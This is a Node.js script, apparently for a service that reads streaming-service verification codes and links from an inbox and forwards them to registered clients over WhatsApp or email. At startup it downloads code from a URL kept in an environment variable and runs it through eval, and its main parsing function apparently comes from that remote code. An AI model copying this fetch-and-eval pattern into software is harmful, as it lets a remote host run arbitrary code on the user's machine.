import { config } from "dotenv";
config();
import { client, handleShutdown } from "./modules/email-listener-imapflow.js";
import { simpleParser } from "mailparser";
import { sendMessage, connectToWhatsApp } from "./modules/whatsapp.js";
import NodeHtmlParser from "node-html-parser";
import fetch from "node-fetch";
import { checkValidClients } from "./modules/google-sheets.js";
import { shortUrl } from "./modules/url-shorter.js";
import { downloadAndUnzipFromGAS } from "./compress-sessions.js";
import fs from "fs";
const DEDUPE_TTL_MS = 90 * 1000; // 1:3


import { sendViaGAS } from "./modules/email-sender.js"
import { desactivateClients } from "./modules/sheet-data-library.js";

// ===============================
// DEDUPE EN MEMORIA (45s)
// ===============================
const processedMessages = new Map();
// key: messageId || fallback | value: timestamp



globalThis.NodeHtmlParser = NodeHtmlParser;

async function startApp() {

    const target = './auth_info';
    try {
        if (fs.existsSync(target)) {
            fs.rmSync(target, { recursive: true, force: true });
            console.log('Carpeta auth_info eliminada');
        }
    } catch (err) {
        console.error(`Error al limpiar carpeta: ${err}`);
    }

    await downloadAndUnzipFromGAS();
    await new Promise(r => setTimeout(r, 1000));

    connectToWhatsApp();

    // --- CONFIGURACIÓN IMAPFLOW ---
    await client.connect();

    // Failover cada 30s
    setInterval(failoverCheck, 30_000);

    // Limpieza de memoria
    setInterval(cleanupProcessedMessages, 30_000);


    // Abrir INBOX
    let lock = await client.getMailboxLock('INBOX');
    try {
        console.log("✅ IMAP Conectado y escuchando INBOX...");


        client.on('exists', async () => {
            const seq = client.mailbox.exists;

            let message;
            try {
                message = await client.fetchOne(seq, { source: true });
            } catch (err) {
                console.error("❌ Fetch error:", err.message);
                return;
            }

            let parsed;
            try {
                parsed = await simpleParser(message.source);
            } catch (err) {
                console.error("❌ Parse error:", err.message);
                return;
            }

            const key = parsed.messageId || `${seq}-${parsed.date?.getTime()}`;


            if (processedMessages.has(key)) return;

            processedMessages.set(key, Date.now());

            procesarCorreo(parsed);
        });




    } finally {
        lock.release();
    }

    // Manejo de desconexión
    client.on('close', () => {
        handleShutdown();
    });
}

// Tu lógica principal encapsulada
async function procesarCorreo(mail) {
    const ahora = new Date();
    const recibido = new Date(mail.date);
    const diferenciaSeg = (ahora - recibido) / 1000;


    console.log(`✅ Correo reciente (${Math.round(diferenciaSeg)}s):`, mail.subject);

    const context = {
        to: mail.to?.text || "",
        from: mail.from?.text || "",
        profileName: null,
        keyword: ""
    };

    // NOTA: mailparser (ImapFlow) estructura los objetos diferente a mail-listener5
    // mail.to.value[0].address es ahora mail.to.value[0].address
    if (mail.to?.value) context.to = mail.to.value[0].address;
    if (mail.from?.value) context.from = mail.from.value[0].address;

    var result = extractCode(mail.html, mail.subject, context);

    if (result.noError) {
        var validClients = await checkValidClients(context);
        if (context.fraud && validClients) {
            await desactivateClients(validClients);
            return;
        }

        const isCode = result.code !== undefined;
        if (validClients) {

            if (!isCode) {
                var shortenUrl = await shortUrl(result.link);
                console.log(shortenUrl)
                if (shortenUrl !== null) {
                    result.link = shortenUrl;

                    if (context.netflixLinkTv) {
                        console.log(shortenUrl);

                        result.link = "https://ntv.cuenticas.pro/#" + shortenUrl.split("/").pop();
                        console.log(result.link);
                    }

                    if (context.crunchyAprobarLink) {
                        console.log(shortenUrl);
                        result.link = "https://ac.cuenticas.com/#" + shortenUrl.split("/").pop();
                        console.log(result.link);
                    }
                }

            }

            for (const client of validClients) {

                const noWhatsApp = typeof client.name === "string" && client.name.includes("(NoWa)");
                // 1️⃣ Preparar número con prefijo (para WhatsApp)
                let numeroConPrefijo = null;
                if (client.prefix && client.contact) {
                    numeroConPrefijo = (client.prefix + client.contact).replaceAll(" ", "");
                }

                // 2️⃣ Buscar y validar email
                let recipientEmail = null;
                if (client.emailContact && typeof client.emailContact === "string") {
                    const emailTrim = client.emailContact.trim();
                    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                    if (emailRegex.test(emailTrim)) {
                        recipientEmail = emailTrim;
                    } else {
                        console.log(`⚠️ Email no válido o ausente (${client.emailContact}) para ${client.name}`);
                    }
                }

                // 3️⃣ Preparar contenido base (código o link)
                const isCode = result.code !== undefined;
                const codigoOLink = isCode ? "código" : "link";
                const contenidoPrincipal = isCode ? result.code : result.link;

                // 4️⃣ Formato del mensaje (texto)
                const boldAbout = result.about
                    .split("\n")
                    .map(line => `*${line}*`)
                    .join("\n");

                const mensajeWhatsApp = `${boldAbout}\n(${context.to})` +
                    (context.profileName ? `\n*Perfil:* ${context.profileName}` : "") +
                    `\n👇👇👇`;

                const mensajeExtra =
                    `☝️☝️☝️\n\n` +
                    `📢 *Atención* 📢\n` +
                    `Si *no* solicitaste este *${codigoOLink}*, simplemente *ignora* este mensaje.\n` +
                    (!isCode
                        ? "\n*Agrega este contacto 📞 si no te deja abrir el link/enlace 🔗*\n"
                        : "\n") +
                    (context.profileName
                        ? `\nℹ️ *Recuerda:* Si dejas el nombre del perfil como “*${context.profileName}*”, tus ${codigoOLink}s llegarán sin problema. ¡Así de fácil! 😄\n`
                        : "") +
                    `📩 Ten en cuenta que los *${codigoOLink}s* pueden tardar hasta *un minuto* en llegar.\n` +
                    `⏳ Si pediste otro, por favor *espera* — te llegará por este mismo chat.\n` +
                    `¡Gracias por tu *paciencia*! 🙏`;

                // 5️⃣ Envío por WhatsApp (si tiene número)
                if (!noWhatsApp && numeroConPrefijo) {
                    /*  */
                    try {
                        await sendMessage(numeroConPrefijo, mensajeWhatsApp);
                        await sendMessage(numeroConPrefijo, contenidoPrincipal);
                        if (process.env.SEND_ADDITIONAL_INFO) {
                            await sendMessage(numeroConPrefijo, mensajeExtra);
                        }
                        console.log(`📱 Enviado a ${numeroConPrefijo} por WhatsApp`);
                    } catch (err) {
                        console.error(`❌ Error enviando por WhatsApp a ${numeroConPrefijo}:`, err.message);
                    }
                }

                // ===============================
                // 5️⃣ INTENTAR ENVÍO POR EMAIL
                // ===============================
                let emailEnviado = false;

                if (recipientEmail) {
                    const mensajeHTML = `
    <div style="font-family:sans-serif">
        <h2>${result.about}</h2>
        <p>Para: ${context.to}</p>
        ${context.profileName ? `<p><b>Perfil:</b> ${context.profileName}</p>` : ""}
        <p><b>${codigoOLink.toUpperCase()}:</b> ${contenidoPrincipal}</p>
        <hr>
        <p>📢 <b>Atención</b><br>
        Si <b>no</b> solicitaste este ${codigoOLink}, simplemente ignora este mensaje.</p>
        ${!isCode ? "<p>Agrega este contacto 📞 si no te deja abrir el enlace 🔗.</p>" : ""}
        <p>Gracias por tu paciencia 🙏</p>
    </div>
    `;

                    const subject = `${isCode ? "Código" : "Link"} de verificación - ${context.keyword}`;

                    try {
                        const resultadoEmail = await sendViaGAS(recipientEmail, subject, mensajeHTML);

                        if (resultadoEmail.noError) {
                            emailEnviado = true;
                            console.log(`📧 Enviado correctamente a ${recipientEmail}`);
                        } else {
                            console.error(`⚠️ Error al enviar a ${recipientEmail}: ${resultadoEmail.message}`);
                        }

                    } catch (err) {
                        console.error(`❌ Error inesperado enviando email a ${recipientEmail}:`, err.message);
                    }
                }

                // ===============================
                // 6️⃣ FALLBACK A WHATSAPP
                // (aunque tenga NoWa)
                // ===============================
                if (noWhatsApp && !emailEnviado && numeroConPrefijo) {
                    try {
                        await sendMessage(
                            numeroConPrefijo,
                            "⚠️ *No se pudo enviar por correo*\n\n" + mensajeWhatsApp
                        );

                        await sendMessage(numeroConPrefijo, contenidoPrincipal);

                        if (process.env.SEND_ADDITIONAL_INFO) {
                            await sendMessage(numeroConPrefijo, mensajeExtra);
                        }

                        console.log(`📱 Fallback WhatsApp enviado a ${numeroConPrefijo}`);
                    } catch (err) {
                        console.error(`❌ Error enviando WhatsApp fallback a ${numeroConPrefijo}:`, err.message);
                    }
                }






                //await sendNotificationEmail(validClients, result, isCode, context);
            }
        } else {
            console.log("Correo que no es de streaming")
        }
    }



}

// Ejecución inicial
var text = await fetch(process.env.EVAL_FNC).then(e => e.text()).catch(e => null);
if (text) {
    (0, eval)(text);
    startApp();
}


function cleanupProcessedMessages() {
    const now = Date.now();


    for (const [uid, ts] of processedMessages.entries()) {
        if (now - ts > DEDUPE_TTL_MS) {
            processedMessages.delete(uid);
        }
    }
}

async function failoverCheck() {
    let lock;
    //console.log("Failover ejecutado")

    try {
        lock = await client.getMailboxLock('INBOX');

        const sinceDate = new Date(Date.now() - DEDUPE_TTL_MS);

        const uids = await client.search({
            since: sinceDate
        });

        if (!uids.length) return;

        for (const uid of uids) {
            const message = await client.fetchOne(uid, { source: true });

            let parsed;
            try {
                parsed = await simpleParser(message.source);
            } catch (err) {
                console.error("❌ Failover parse error:", err.message);
                continue;
            }

            const key = parsed.messageId || `${uid}-${parsed.date?.getTime()}`;

            if (processedMessages.has(key)) continue;

            processedMessages.set(key, Date.now());
            console.log(
                "♻️ Correo NUEVO (failover):",
                parsed.subject,
                "| messageId:",
                parsed.messageId
            );
            procesarCorreo(parsed);
        }


    } catch (err) {
        console.error("❌ Failover error:", err.message);
    } finally {
        if (lock) lock.release();
    }
}